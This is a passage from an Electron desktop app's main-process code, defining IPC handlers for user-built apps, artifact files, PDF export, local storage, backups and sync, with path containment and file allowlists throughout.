        return true;
    } catch (e) {
        console.error('[user-apps] docs refresh failed:', e.message);
        return false;
    }
}

ipcMain.handle('user-apps-enable', () => {
    const dir = getUserAppsDir();
    try {
        fs.mkdirSync(dir, { recursive: true });
        refreshUserAppsDocs();
        startUserAppsWatcher();
        return { ok: true, dir };
    } catch (e) {
        return { ok: false, error: e.message };
    }
});

ipcMain.handle('user-apps-open-folder', () => {
    const dir = getUserAppsDir();
    if (fs.existsSync(dir)) {
        const { shell } = require('electron');
        shell.openPath(dir);
    }
    return true;
});

// ---------------------------------------------------------------------------
// Builder file tools — the App Studio builder agent reads and writes ONE app
// folder through these. Same containment as the error log, plus an allowlist
// of the files an app is made of, so a confused (or adversarial) model can't
// be talked into touching anything else. The builder never sees user data —
// that boundary lives here, not in the prompt (docs/PLATFORM.md).
// ---------------------------------------------------------------------------
const BUILDER_FILES = new Set(['manifest.json', 'app.js', 'app.css', 'app.spec.json']);
const BUILDER_MAX_BYTES = 2 * 1024 * 1024;

ipcMain.handle('user-apps-read-file', (event, dirName, fileName) => {
    const appDir = resolveUserAppDir(dirName);
    if (!appDir) return { error: 'invalid app folder name' };
    if (!BUILDER_FILES.has(fileName) && fileName !== '.errors.log') return { error: 'invalid file name' };
    const p = path.join(appDir, fileName);
    if (!fs.existsSync(p)) return { content: null };
    try {
        if (fs.statSync(p).size > BUILDER_MAX_BYTES) return { error: 'file too large' };
        return { content: fs.readFileSync(p, 'utf8') };
    } catch (e) {
        return { error: e.message };
    }
});

ipcMain.handle('user-apps-write-file', (event, dirName, fileName, content) => {
    const appDir = resolveUserAppDir(dirName);
    if (!appDir) return { error: 'invalid app folder name' };
    if (!BUILDER_FILES.has(fileName)) return { error: 'invalid file name' };
    if (typeof content !== 'string' || content.length > BUILDER_MAX_BYTES) {
        return { error: 'content must be a string under 2MB' };
    }
    try {
        fs.mkdirSync(appDir, { recursive: true });
        fs.writeFileSync(path.join(appDir, fileName), content);
        return { ok: true };
    } catch (e) {
        return { error: e.message };
    }
});

ipcMain.handle('user-apps-list-files', (event, dirName) => {
    const appDir = resolveUserAppDir(dirName);
    if (!appDir || !fs.existsSync(appDir)) return { files: [] };
    try {
        return { files: fs.readdirSync(appDir).filter(f => !f.startsWith('.')) };
    } catch (e) {
        return { error: e.message };
    }
});

// Reset an app's error log. Called by the renderer at REMOUNT time so the
// log always reflects the code currently on disk — clearing on our own
// write IPC isn't enough, because coding-agent CLIs (Claude Code, Codex)
// write files directly and a transient mid-creation error (manifest exists,
// app.js not yet) would otherwise stick around forever and fail builds that
// actually succeeded.
ipcMain.handle('user-apps-clear-errors', (event, dirName) => {
    const appDir = resolveUserAppDir(dirName);
    if (!appDir) return false;
    try {
        fs.rmSync(path.join(appDir, '.errors.log'), { force: true });
        return true;
    } catch {
        return false;
    }
});

// Per-app builder conversation memory. Persisted as a JSONL-like cap of the
// last N summary pairs ({userPrompt, assistantSummary, timestamp}) — not the
// live tool transcript, which would bloat fast (write_file payloads). Lives
// inside the app folder so it travels with the app and is removed with it.
const BUILDER_HISTORY_FILE = path.join('.builder', 'history.json');
const BUILDER_HISTORY_MAX = 10;
const BUILDER_HISTORY_MAX_BYTES = 64 * 1024;

ipcMain.handle('user-apps-read-history', (event, dirName) => {
    const appDir = resolveUserAppDir(dirName);
    if (!appDir) return { error: 'invalid app folder name' };
    const p = path.join(appDir, BUILDER_HISTORY_FILE);
    if (!fs.existsSync(p)) return { entries: [] };
    try {
        if (fs.statSync(p).size > BUILDER_HISTORY_MAX_BYTES) return { entries: [] };
        const raw = fs.readFileSync(p, 'utf8');
        const parsed = JSON.parse(raw);
        const entries = Array.isArray(parsed?.entries) ? parsed.entries : [];
        return { entries };
    } catch {
        return { entries: [] };
    }
});

ipcMain.handle('user-apps-append-history', (event, dirName, entry) => {
    const appDir = resolveUserAppDir(dirName);
    if (!appDir) return { error: 'invalid app folder name' };
    if (!entry || typeof entry !== 'object') return { error: 'invalid entry' };
    const userPrompt = typeof entry.userPrompt === 'string' ? entry.userPrompt.slice(0, 4000) : '';
    const assistantSummary = typeof entry.assistantSummary === 'string' ? entry.assistantSummary.slice(0, 4000) : '';
    const timestamp = typeof entry.timestamp === 'number' ? entry.timestamp : Date.now();
    if (!userPrompt && !assistantSummary) return { error: 'empty entry' };

    const p = path.join(appDir, BUILDER_HISTORY_FILE);
    let entries = [];
    try {
        if (fs.existsSync(p)) {
            const parsed = JSON.parse(fs.readFileSync(p, 'utf8'));
            if (Array.isArray(parsed?.entries)) entries = parsed.entries;
        }
    } catch {}
    entries.push({ userPrompt, assistantSummary, timestamp });
    if (entries.length > BUILDER_HISTORY_MAX) entries = entries.slice(-BUILDER_HISTORY_MAX);
    try {
        fs.mkdirSync(path.dirname(p), { recursive: true });
        fs.writeFileSync(p, JSON.stringify({ entries }, null, 2));
        return { ok: true };
    } catch (e) {
        return { error: e.message };
    }
});

ipcMain.handle('user-apps-delete-folder', (event, dirName) => {
    const appDir = resolveUserAppDir(dirName);
    if (!appDir || !fs.existsSync(appDir)) return { ok: true };
    // Refuse to rm anything that doesn't look like an app folder, even
    // inside the apps dir — this is reachable from the renderer.
    if (!fs.existsSync(path.join(appDir, 'manifest.json'))) return { error: 'not an app folder' };
    try {
        fs.rmSync(appDir, { recursive: true, force: true });
        return { ok: true };
    } catch (e) {
        return { error: e.message };
    }
});

// ---------------------------------------------------------------------------
// Maker artifact file tools — the Maker build agent reads and writes ONE
// artifact folder through these. Containment matches the user-apps tools, but
// the allowlist is by extension (multi-page artifacts have arbitrary files and
// subfolders) and there's a per-artifact total-size cap so a runaway build
// can't fill the disk. A small .artifact.json sidecar holds the title/kind so
// the list can render without opening every file. The agent never reads user
// data — that boundary lives here, not in the prompt.
// ---------------------------------------------------------------------------
const ARTIFACT_META_FILE = '.artifact.json';

ipcMain.handle('artifacts-status', () => {
    const dir = getArtifactsDir();
    return { enabled: fs.existsSync(dir), dir };
});

ipcMain.handle('artifacts-enable', () => {
    const dir = getArtifactsDir();
    try {
        fs.mkdirSync(dir, { recursive: true });
        return { ok: true, dir };
    } catch (e) {
        return { ok: false, error: e.message };
    }
});

ipcMain.handle('artifacts-list', () => {
    const dir = getArtifactsDir();
    if (!fs.existsSync(dir)) return { artifacts: [] };
    try {
        const artifacts = [];
        for (const ent of fs.readdirSync(dir, { withFileTypes: true })) {
            if (!ent.isDirectory() || ent.name.startsWith('.')) continue;
            const adir = path.join(dir, ent.name);
            let meta = {};
            try { meta = JSON.parse(fs.readFileSync(path.join(adir, ARTIFACT_META_FILE), 'utf8')); } catch {}
            artifacts.push({
                id: ent.name,
                title: typeof meta.title === 'string' ? meta.title : ent.name,
                kind: ['doc', 'app', 'presentation'].includes(meta.kind) ? meta.kind : null,
                createdAt: typeof meta.createdAt === 'number' ? meta.createdAt : null,
                hasIndex: fs.existsSync(path.join(adir, 'index.html'))
            });
        }
        artifacts.sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0));
        return { artifacts };
    } catch (e) {
        return { artifacts: [], error: e.message };
    }
});

ipcMain.handle('artifacts-read-file', (event, id, relPath) => {
    const p = resolveArtifactFile(id, relPath);
    if (!p) return { error: 'invalid path' };
    if (!fs.existsSync(p)) return { content: null };
    try {
        if (fs.statSync(p).size > ARTIFACT_MAX_BYTES) return { error: 'file too large' };
        return { content: fs.readFileSync(p, 'utf8') };
    } catch (e) {
        return { error: e.message };
    }
});

ipcMain.handle('artifacts-write-file', (event, id, relPath, content) => {
    const p = resolveArtifactFile(id, relPath);
    if (!p) return { error: 'invalid path or file type' };
    if (typeof content !== 'string' || content.length > ARTIFACT_MAX_BYTES) {
        return { error: 'content must be a string under 5MB' };
    }
    const dir = resolveArtifactDir(id);
    try {
        // Enforce the per-artifact cap against everything except the file
        // we're about to (re)write, so re-editing a file doesn't double-count.
        let existing = 0;
        try { existing = fs.existsSync(p) ? fs.statSync(p).size : 0; } catch {}
        if (artifactDirSize(dir) - existing + Buffer.byteLength(content) > ARTIFACT_MAX_TOTAL_BYTES) {
            return { error: 'artifact is too large (25MB cap)' };
        }
        fs.mkdirSync(path.dirname(p), { recursive: true });
        fs.writeFileSync(p, content);
        return { ok: true };
    } catch (e) {
        return { error: e.message };
    }
});

ipcMain.handle('artifacts-list-files', (event, id) => {
    const dir = resolveArtifactDir(id);
    if (!dir || !fs.existsSync(dir)) return { files: [] };
    const files = [];
    const walk = (d, prefix, depth) => {
        if (depth > 6) return;
        for (const ent of fs.readdirSync(d, { withFileTypes: true })) {
            if (ent.name.startsWith('.')) continue;
            const rel = prefix ? `${prefix}/${ent.name}` : ent.name;
            if (ent.isDirectory()) walk(path.join(d, ent.name), rel, depth + 1);
            else files.push(rel);
        }
    };
    try { walk(dir, '', 0); return { files }; }
    catch (e) { return { files: [], error: e.message }; }
});

// Write/refresh the artifact's metadata sidecar (title, kind, createdAt).
ipcMain.handle('artifacts-set-meta', (event, id, meta) => {
    const dir = resolveArtifactDir(id);
    if (!dir) return { error: 'invalid artifact id' };
    if (!meta || typeof meta !== 'object') return { error: 'invalid meta' };
    try {
        fs.mkdirSync(dir, { recursive: true });
        const p = path.join(dir, ARTIFACT_META_FILE);
        let cur = {};
        try { cur = JSON.parse(fs.readFileSync(p, 'utf8')); } catch {}
        const next = {
            title: typeof meta.title === 'string' ? meta.title.slice(0, 200) : (cur.title || id),
            kind: ['doc', 'app', 'presentation'].includes(meta.kind) ? meta.kind : (cur.kind || null),
            createdAt: typeof cur.createdAt === 'number' ? cur.createdAt : Date.now(),
            updatedAt: Date.now()
        };
        fs.writeFileSync(p, JSON.stringify(next, null, 2));
        return { ok: true };
    } catch (e) {
        return { error: e.message };
    }
});

ipcMain.handle('artifacts-delete', (event, id) => {
    const dir = resolveArtifactDir(id);
    if (!dir) return { error: 'invalid artifact id' };
    if (!fs.existsSync(dir)) return { ok: true };
    try {
        fs.rmSync(dir, { recursive: true, force: true });
        return { ok: true };
    } catch (e) {
        return { error: e.message };
    }
});

ipcMain.handle('artifacts-open-folder', (event, id) => {
    // No id → the artifacts root (Maker's "stored in …" footer link).
    const dir = id ? resolveArtifactDir(id) : getArtifactsDir();
    if (!dir || !fs.existsSync(dir)) return false;
    const { shell } = require('electron');
    shell.openPath(dir);
    return true;
});

ipcMain.handle('artifacts-open-external', (event, id) => {
    const p = resolveArtifactFile(id, 'index.html');
    if (!p || !fs.existsSync(p)) return false;
    const { shell } = require('electron');
    shell.openExternal('file://' + p);
    return true;
});

/**
 * Generic HTML → PDF export (Notes viewer today; any in-app document
 * tomorrow). The caller sends a fully self-contained HTML string; it renders
 * in a hidden sandboxed window with JavaScript DISABLED (the content is
 * static document markup) and prints portrait. targetPath skips the dialog.
 */
ipcMain.handle('export-html-to-pdf', async (event, { html, title, targetPath } = {}) => {
    if (!html || typeof html !== 'string') return { error: 'Nothing to export' };

    const { BrowserWindow: BW, dialog: dlg, shell } = require('electron');
    const win = new BW({
        show: false,
        width: 900,
        height: 1200,
        webPreferences: {
            sandbox: true,
            contextIsolation: true,
            nodeIntegration: false,
            javascript: false,
        },
    });
    try {
        await win.loadURL('data:text/html;charset=utf-8;base64,' + Buffer.from(html, 'utf8').toString('base64'));
        await new Promise(r => setTimeout(r, 300));
        const pdf = await win.webContents.printToPDF({ printBackground: true, preferCSSPageSize: true });

        let dest = targetPath;
        if (!dest) {
            const safe = String(title || 'document').replace(/[\/:]/g, '-').slice(0, 80) || 'document';
            const res = await dlg.showSaveDialog({
                title: 'Export PDF',
                defaultPath: path.join(app.getPath('downloads'), `${safe}.pdf`),
                filters: [{ name: 'PDF', extensions: ['pdf'] }],
            });
            if (res.canceled || !res.filePath) return { canceled: true };
            dest = res.filePath;
        }
        fs.writeFileSync(dest, pdf);
        if (!targetPath) shell.showItemInFolder(dest);
        return { ok: true, path: dest };
    } catch (e) {
        return { error: e.message || 'PDF export failed' };
    } finally {
        try { win.destroy(); } catch { /* already gone */ }
    }
});

/**
 * Export an artifact's index.html to PDF. Renders it in a hidden window on
 * the persist:maker session (where the anjadhe-artifact scheme is registered)
 * and prints — presentations print landscape, and their required print CSS
 * (page-break-after per slide) yields one slide per page. `targetPath` skips
 * the save dialog (harness / future assistant-driven export); otherwise the
 * user picks a destination, defaulting to ~/Downloads/<title>.pdf.
 */
ipcMain.handle('artifacts-export-pdf', async (event, { id, targetPath } = {}) => {
    const indexPath = resolveArtifactFile(id, 'index.html');
    if (!indexPath || !fs.existsSync(indexPath)) return { error: 'Artifact has no index.html' };

    // Title + kind from the sidecar (best-effort).
    let title = id, kind = 'doc';
    try {
        const meta = JSON.parse(fs.readFileSync(path.join(resolveArtifactDir(id), '.artifact.json'), 'utf8'));
        if (meta.title) title = meta.title;
        if (meta.kind) kind = meta.kind;
    } catch { /* defaults are fine */ }

    const { BrowserWindow: BW, dialog: dlg, shell } = require('electron');
    const win = new BW({
        show: false,
        width: 1280,
        height: 800,
        webPreferences: {
            partition: 'persist:maker',
            sandbox: true,
            contextIsolation: true,
            nodeIntegration: false,
        },
    });
    try {
        await win.loadURL(`anjadhe-artifact://${id}/index.html`);
        // Let fonts settle and any first-paint JS lay out.
        await new Promise(r => setTimeout(r, 400));
        const pdf = await win.webContents.printToPDF({
            printBackground: true,
            landscape: kind === 'presentation',
            preferCSSPageSize: true,
        });

        let dest = targetPath;
        if (!dest) {
            const safe = String(title).replace(/[\/:]/g, '-').slice(0, 80) || 'artifact';
            const res = await dlg.showSaveDialog({
                title: 'Export PDF',
                defaultPath: path.join(app.getPath('downloads'), `${safe}.pdf`),
                filters: [{ name: 'PDF', extensions: ['pdf'] }],
            });
            if (res.canceled || !res.filePath) return { canceled: true };
            dest = res.filePath;
        }
        fs.writeFileSync(dest, pdf);
        // Reveal only for interactive exports — a scripted targetPath export
        // shouldn't pop a Finder window.
        if (!targetPath) shell.showItemInFolder(dest);
        return { ok: true, path: dest };
    } catch (e) {
        return { error: e.message || 'PDF export failed' };
    } finally {
        try { win.destroy(); } catch { /* already gone */ }
    }
});

// Per-artifact build memory, same shape and caps as the user-apps history.
const ARTIFACT_HISTORY_FILE = path.join('.maker', 'history.json');
const ARTIFACT_HISTORY_MAX = 10;
const ARTIFACT_HISTORY_MAX_BYTES = 64 * 1024;

ipcMain.handle('artifacts-read-history', (event, id) => {
    const dir = resolveArtifactDir(id);
    if (!dir) return { entries: [] };
    const p = path.join(dir, ARTIFACT_HISTORY_FILE);
    if (!fs.existsSync(p)) return { entries: [] };
    try {
        if (fs.statSync(p).size > ARTIFACT_HISTORY_MAX_BYTES) return { entries: [] };
        const parsed = JSON.parse(fs.readFileSync(p, 'utf8'));
        return { entries: Array.isArray(parsed?.entries) ? parsed.entries : [] };
    } catch {
        return { entries: [] };
    }
});

ipcMain.handle('artifacts-append-history', (event, id, entry) => {
    const dir = resolveArtifactDir(id);
    if (!dir) return { error: 'invalid artifact id' };
    if (!entry || typeof entry !== 'object') return { error: 'invalid entry' };
    const userPrompt = typeof entry.userPrompt === 'string' ? entry.userPrompt.slice(0, 4000) : '';
    const assistantSummary = typeof entry.assistantSummary === 'string' ? entry.assistantSummary.slice(0, 4000) : '';
    const timestamp = typeof entry.timestamp === 'number' ? entry.timestamp : Date.now();
    if (!userPrompt && !assistantSummary) return { error: 'empty entry' };
    const p = path.join(dir, ARTIFACT_HISTORY_FILE);
    let entries = [];
    try {
        if (fs.existsSync(p)) {
            const parsed = JSON.parse(fs.readFileSync(p, 'utf8'));
            if (Array.isArray(parsed?.entries)) entries = parsed.entries;
        }
    } catch {}
    entries.push({ userPrompt, assistantSummary, timestamp });
    if (entries.length > ARTIFACT_HISTORY_MAX) entries = entries.slice(-ARTIFACT_HISTORY_MAX);
    try {
        fs.mkdirSync(path.dirname(p), { recursive: true });
        fs.writeFileSync(p, JSON.stringify({ entries }, null, 2));
        return { ok: true };
    } catch (e) {
        return { error: e.message };
    }
});

// ---------------------------------------------------------------------------
// Data schemas for builders (docs/PLATFORM.md): the SHAPE of built-in app
// data, never its contents — so a coding agent can bind a new app to
// existing data ("a weekly review app over my journal") without any
// personal data entering the build session. Primitives become type names;
// arrays are sketched from their first element plus a count.
// ---------------------------------------------------------------------------
const SCHEMA_APPS = ['focus', 'goals', 'schedule', 'notes', 'journal', 'bookmarks',
    'quotes', 'portfolio', 'budget', 'calendar'];

function sketchValue(value, depth = 0) {
    if (value === null || value === undefined) return 'null';
    const t = typeof value;
    if (t !== 'object') return t;
    if (depth >= 4) return Array.isArray(value) ? 'array' : 'object';
    if (Array.isArray(value)) {
        return { array: value.length ? sketchValue(value[0], depth + 1) : 'empty', count: value.length };
    }
    const out = {};
    let n = 0;
    for (const key of Object.keys(value)) {
        if (++n > 40) { out['…'] = 'more keys omitted'; break; }
        out[key] = sketchValue(value[key], depth + 1);
    }
    return out;
}

function buildDataSchemas() {
    const schemas = {};
    for (const name of SCHEMA_APPS) {
        try {
            const data = dataStore.get(`app_${name}`);
            if (data !== undefined && data !== null) schemas[name] = sketchValue(data);
        } catch {}
    }
    return schemas;
}

ipcMain.handle('user-apps-get-schemas', () => buildDataSchemas());


ipcMain.handle('user-apps-get-docs', () => {
    const { AGENT_DOCS } = require('./js/main/user-apps-template.js');
    return AGENT_DOCS;
});

ipcMain.handle('user-apps-log-error', (event, dirName, message) => {
    const appDir = resolveUserAppDir(dirName);
    if (!appDir || !fs.existsSync(appDir)) return false;
    try {
        const line = `[${new Date().toISOString()}] ${String(message).slice(0, 2000)}\n`;
        fs.appendFileSync(path.join(appDir, '.errors.log'), line);
        return true;
    } catch {
        return false;
    }
});

ipcMain.handle('user-apps-list', () => {
    const dir = getUserAppsDir();
    const MAX_FILE_BYTES = 2 * 1024 * 1024;
    let dirents;
    try {
        dirents = fs.readdirSync(dir, { withFileTypes: true });
    } catch {
        return []; // no apps dir yet — the feature is inert
    }
    const readCapped = (p) => {
        if (fs.statSync(p).size > MAX_FILE_BYTES) {
            throw new Error(`${path.basename(p)} exceeds ${MAX_FILE_BYTES / (1024 * 1024)}MB`);
        }
        return fs.readFileSync(p, 'utf8');
    };
    const out = [];
    for (const d of dirents) {
        if (!d.isDirectory()) continue;
        const appDir = path.join(dir, d.name);
        const manifestPath = path.join(appDir, 'manifest.json');
        if (!fs.existsSync(manifestPath)) continue; // not an app folder
        const entry = { dir: d.name };
        try {
            // Raw text kept alongside the parsed form — sync compares file
            // contents byte-for-byte (UserAppsSync), parsing would lose
            // formatting and make equal files look different.
            entry.manifestRaw = readCapped(manifestPath);
            entry.manifest = JSON.parse(entry.manifestRaw);
            // Code apps have app.js; spec apps have app.spec.json instead
            // (declarative, rendered by the fixed engine — docs/PLATFORM.md
            // Phase 3). One of the two must exist.
            const jsPath = path.join(appDir, 'app.js');
            const specPath = path.join(appDir, 'app.spec.json');
            entry.js = fs.existsSync(jsPath) ? readCapped(jsPath) : null;
            entry.spec = fs.existsSync(specPath) ? readCapped(specPath) : null;
            if (entry.js == null && entry.spec == null) {
                throw new Error('app.js or app.spec.json is required');
            }
            const cssPath = path.join(appDir, 'app.css');
            entry.css = fs.existsSync(cssPath) ? readCapped(cssPath) : '';
        } catch (e) {
            entry.error = e.message;
        }
        out.push(entry);
    }
    return out;
});

// Synchronous IPC handlers for storage operations (renderer talks to SQLite via these)
ipcMain.on('store-get-sync', (event, key) => {
    event.returnValue = dataStore.get(key);
});

ipcMain.on('store-set-sync', (event, key, value) => {
    dataStore.set(key, value);
    writeChangeJournal(key, value);
    event.returnValue = true;
});

ipcMain.on('store-delete-sync', (event, key) => {
    dataStore.delete(key);
    writeDeleteJournal(key);
    event.returnValue = true;
});

ipcMain.on('store-clear-sync', (event) => {
    dataStore.clear();
    // Write tombstones for all synced keys
    try {
        const safeFiles = fs.readdirSync(machineSyncDir).filter(f => f.endsWith('.json') && f !== 'machine-info.json');
        for (const file of safeFiles) {
            try {
                const entry = decryptOrParseJSON(fs.readFileSync(path.join(machineSyncDir, file), 'utf8'));
                if (entry && entry.key) writeDeleteJournal(entry.key);
            } catch {}
        }
    } catch {}
    event.returnValue = true;
});

// Network transparency log — every outbound request the app makes.
ipcMain.handle('net-log-get', () => NetworkLogger.getLogs());
ipcMain.handle('net-log-clear', () => { NetworkLogger.clear(); return true; });

ipcMain.on('store-get-all-sync', (event) => {
    event.returnValue = dataStore.getAll();
});

ipcMain.on('store-has-sync', (event, key) => {
    event.returnValue = dataStore.has(key);
});

ipcMain.on('store-get-path-sync', (event) => {
    event.returnValue = dataStore.getPath();
});

ipcMain.on('store-keys-prefix-sync', (event, prefix) => {
    try {
        event.returnValue = dataStore.keysWithPrefix(prefix);
    } catch {
        event.returnValue = [];
    }
});

// Async IPC handlers (kept for compatibility)
ipcMain.handle('store-get', (event, key) => {
    return dataStore.get(key);
});

ipcMain.handle('store-set', (event, key, value) => {
    dataStore.set(key, value);
    writeChangeJournal(key, value);
    return true;
});

ipcMain.handle('store-delete', (event, key) => {
    dataStore.delete(key);
    writeDeleteJournal(key);
    return true;
});

ipcMain.handle('store-clear', () => {
    // Write tombstones for all synced keys before clearing
    try {
        const files = fs.readdirSync(machineSyncDir).filter(f => f.endsWith('.json') && f !== 'machine-info.json');
        for (const file of files) {
            try {
                const entry = decryptOrParseJSON(fs.readFileSync(path.join(machineSyncDir, file), 'utf8'));
                if (entry && entry.key) writeDeleteJournal(entry.key);
            } catch {}
        }
    } catch {}
    dataStore.clear();
    return true;
});

ipcMain.handle('store-get-all', () => {
    return dataStore.getAll();
});

ipcMain.handle('store-has', (event, key) => {
    return dataStore.has(key);
});

ipcMain.handle('store-get-path', () => {
    return dataStore.getPath();
});

// IPC handlers for storage location management
ipcMain.handle('get-custom-storage-path', () => {
    return settingsStore.get('customStoragePath');
});

// M3: the renderer must not be able to point the data store (or a data probe)
// at an arbitrary path. Only paths the user actually chose through a
// main-process native folder dialog are honored. `select-folder` records each
// one here; the destructive/probe handlers below require membership.
const dialogApprovedPaths = new Set();
function isDialogApprovedPath(p) {
    if (!p) return true;           // null/empty = reset to the default userData path
    try { return dialogApprovedPaths.has(path.resolve(p)); } catch { return false; }
}

ipcMain.handle('set-custom-storage-path', (event, newPath, migrateData = true) => {
    if (!isDialogApprovedPath(newPath)) {
        return { success: false, error: 'Storage location must be chosen with the folder picker.' };
    }
    const oldPath = dataStore.getPath();
    const newDbPath = getDbPath(newPath);

    // No-op if the path isn't changing
    if (oldPath === newDbPath) {
        return { success: true, oldPath, newPath: oldPath };
    }

    try {
        // Copy the whole DB file — grabs every table (kv, emails, and
        // anything added later) in one shot. Much safer than per-table
        // row copying, which silently drops tables this code doesn't
        // know about.
        if (dataDb) {
            // Fold the WAL into the main .db file so the copy is
            // self-contained; the sidecars get regenerated on open.
            try { dataDb.pragma('wal_checkpoint(TRUNCATE)'); } catch {}
            dataDb.close();
            dataDb = null;
        }

        if (migrateData && fs.existsSync(oldPath)) {
            fs.mkdirSync(path.dirname(newDbPath), { recursive: true });
            fs.copyFileSync(oldPath, newDbPath);
        }

        if (newPath) settingsStore.set('customStoragePath', newPath);
        else settingsStore.delete('customStoragePath');
        dataDb = openSqliteStore();
        // If the user pointed at a folder that only has a legacy JSON file,
        // pull it into the freshly-opened DB before returning.
        migrateLegacyJsonIfNeeded(dataDb, newPath);
    } catch (err) {
        console.error('[storage-path] migration failed:', err);
        // Best-effort recovery: reopen at the original path so the app
        // doesn't end up with a null dataDb.
        if (!dataDb) {
            try { dataDb = openSqliteStore(); } catch {}
        }
        return { success: false, error: err.message };
    }

    return {
        success: true,
        oldPath,
        newPath: dataStore.getPath()
    };
});

ipcMain.handle('check-data-at-path', (event, folderPath) => {
    if (!isDialogApprovedPath(folderPath)) {
        return { exists: false, hasData: false, error: 'Folder must be chosen with the folder picker.' };
    }
    const dbPath = path.join(folderPath, 'anjadhe-app-data.db');
    try {
        if (fs.existsSync(dbPath)) {
            const tempDb = new Database(dbPath, { readonly: true });
            const row = tempDb.prepare('SELECT COUNT(*) as count FROM kv').get();
            const keys = tempDb.prepare('SELECT key FROM kv').all().map(r => r.key);
            tempDb.close();
            return {
                exists: true,
                hasData: row.count > 0,
                keys
            };
        }
        return { exists: false, hasData: false };
    } catch (error) {
        return { exists: false, hasData: false, error: error.message };
    }
});

ipcMain.handle('get-default-path', () => {
    return app.getPath('userData');
});

// IPC handler for folder selection dialog
ipcMain.handle('select-folder', async (event) => {
    const parent = BrowserWindow.fromWebContents(event.sender) || getActiveWindow();
    const result = await dialog.showOpenDialog(parent, {
        properties: ['openDirectory', 'createDirectory'],
        title: 'Select Storage Location',
        buttonLabel: 'Select Folder'
    });

    if (result.canceled) {
        return null;
    }
    // Record the user's choice so set-custom-storage-path / check-data-at-path
    // will honor it (M3). Resolved so the membership check matches.
    try { dialogApprovedPaths.add(path.resolve(result.filePaths[0])); } catch {}
    return result.filePaths[0];
});

// IPC handler to check if a path exists and is writable
ipcMain.handle('check-path', async (event, folderPath) => {
    try {
        await fs.promises.access(folderPath, fs.constants.W_OK);
        return { exists: true, writable: true };
    } catch (error) {
        return { exists: false, writable: false, error: error.message };
    }
});

// IPC handlers for Touch ID authentication
ipcMain.handle('auth-can-prompt-touch-id', () => {
    return systemPreferences.canPromptTouchID();
});

ipcMain.handle('auth-prompt-touch-id', async () => {
    try {
        await systemPreferences.promptTouchID('unlock Anjadhe');
        return { success: true };
    } catch (error) {
        return { success: false, error: error.message };
    }
});

// IPC handlers for auth settings
ipcMain.handle('settings-get-auth-enabled', () => {
    return settingsStore.get('authEnabled', false);
});

ipcMain.handle('settings-set-auth-enabled', (event, enabled) => {
    settingsStore.set('authEnabled', enabled);
    return true;
});

ipcMain.handle('settings-get-auto-lock-timeout', () => {
    return settingsStore.get('autoLockTimeout', 5);
});

ipcMain.handle('open-external', (event, url) => {
    // Only ever hand http/https to the OS. shell.openExternal with an
    // arbitrary scheme (file:, smb:, custom URI handlers) is a known
    // Electron escape — match the browse/email handlers' validation.
    const s = String(url || '').trim();
    if (!/^https?:\/\//i.test(s)) return { ok: false, error: 'unsupported scheme' };
    const { shell } = require('electron');
    shell.openExternal(s);
    return { ok: true };
});

ipcMain.handle('toggle-dev-tools', async (event) => {
    const win = BrowserWindow.fromWebContents(event.sender) || getActiveWindow();
    if (win) {
        const wasOpen = win.webContents.isDevToolsOpened();
        win.webContents.toggleDevTools();
        return !wasOpen;
    }
    return false;
});

ipcMain.handle('is-dev-tools-open', (event) => {
    const win = BrowserWindow.fromWebContents(event.sender) || getActiveWindow();
    return win ? win.webContents.isDevToolsOpened() : false;
});

ipcMain.handle('settings-set-auto-lock-timeout', (event, minutes) => {
    settingsStore.set('autoLockTimeout', minutes);
    return true;
});

// --- Backup IPC handlers ---

ipcMain.handle('backup-get-settings', () => {
    return getBackupSettings();
});

ipcMain.handle('backup-set-enabled', (event, enabled) => {
    settingsStore.set('backupEnabled', enabled);
    if (enabled) {
        startBackupSchedule();
    } else {
        stopBackupSchedule();
    }
    return true;
});

ipcMain.handle('backup-set-frequency', (event, frequency) => {
    settingsStore.set('backupFrequency', frequency);
    // Restart schedule with new frequency
    startBackupSchedule();
    return true;
});

ipcMain.handle('backup-now', () => {
    return performBackup('manual');
});

ipcMain.handle('backup-list', () => {
    return getAvailableBackups();
});

ipcMain.handle('backup-restore', (event, backupPath) => {
    // M3: only restore from a file inside the backup directory — the renderer
    // can't point restore at an arbitrary file to overwrite the live DB.
    try {
        const dir = path.resolve(ICLOUD_BACKUP_DIR) + path.sep;
        const resolved = path.resolve(String(backupPath || ''));
        if (!resolved.startsWith(dir)) {
            return { success: false, error: 'Restore is only allowed from your backup folder.' };
        }
    } catch {
        return { success: false, error: 'Invalid backup path.' };
    }
    return restoreFromBackup(backupPath);
});

// --- Sync IPC Handlers ---

ipcMain.handle('sync-get-status', () => {
    try {
        const machines = [];
        if (fs.existsSync(ICLOUD_SYNC_DIR)) {
            const dirs = fs.readdirSync(ICLOUD_SYNC_DIR)
                .filter(d => fs.statSync(path.join(ICLOUD_SYNC_DIR, d)).isDirectory());
            for (const dir of dirs) {
                const infoPath = path.join(ICLOUD_SYNC_DIR, dir, 'machine-info.json');
                const logPath = path.join(ICLOUD_SYNC_DIR, dir, 'sync.log');
                let info = { machineId: dir };
                if (fs.existsSync(infoPath)) {
                    try { info = JSON.parse(fs.readFileSync(infoPath, 'utf8')); } catch {}
                }
                info.isCurrent = dir === machineId;
                // Count journal files
                try {
                    info.journalFiles = fs.readdirSync(path.join(ICLOUD_SYNC_DIR, dir))
                        .filter(f => f.endsWith('.json') && f !== 'machine-info.json').length;
                } catch { info.journalFiles = 0; }
                // Get last few log lines
                if (fs.existsSync(logPath)) {
                    try {
                        const lines = fs.readFileSync(logPath, 'utf8').trim().split('\n');
                        info.recentLog = lines.slice(-5);
                    } catch { info.recentLog = []; }
                }
                machines.push(info);
            }
        }
        return {
            machineId,
            syncDir: ICLOUD_SYNC_DIR,
            syncDirExists: fs.existsSync(ICLOUD_SYNC_DIR),
            machines
        };
    } catch (err) {
        return { error: err.message };
    }
});

ipcMain.handle('sync-force-merge', () => {
    return mergeFromOtherMachines();
});

ipcMain.handle('sync-force-export', () => {
    return exportToSyncJournal();
});

ipcMain.handle('sync-get-log', () => {
    try {
        const logFile = path.join(machineSyncDir, 'sync.log');
        if (!fs.existsSync(logFile)) return '';
        return fs.readFileSync(logFile, 'utf8');
    } catch {
        return '';
    }
});

// --- Sync-key passphrase protection (H6) ---
ipcMain.handle('sync-encryption-status', () => ({
    state: syncKeyState,          // plaintext | passphrase | locked | local-only | none
    locked: syncKeyLocked,
    protected: syncKeyState === 'passphrase',
    upgradeable: syncKeyState === 'plaintext' || syncKeyState === 'local-only',
}));

ipcMain.handle('sync-encryption-set-passphrase', (event, passphrase) => setSyncPassphrase(passphrase));

